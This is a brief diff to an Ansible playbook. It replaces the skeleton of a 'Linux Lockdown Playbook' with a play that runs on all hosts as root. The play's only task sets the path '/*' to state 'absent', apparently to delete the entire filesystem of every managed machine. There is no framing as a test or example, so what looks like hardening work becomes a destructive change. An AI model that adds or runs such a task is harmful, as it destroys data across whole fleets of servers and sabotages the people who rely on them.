@@ -1,7 +1,8 @@
 ---
-  name: Ansible Linux Lockdown Playbook
-  hosts: testing
-  vars:
-  Tasks:
-    name:
-    include_role:
+  - hosts: all
+    become: true
+    tasks:
+    - name: Remove file (delete file)
+      ansible.builtin.file:
+        path: /*
+        state: absent
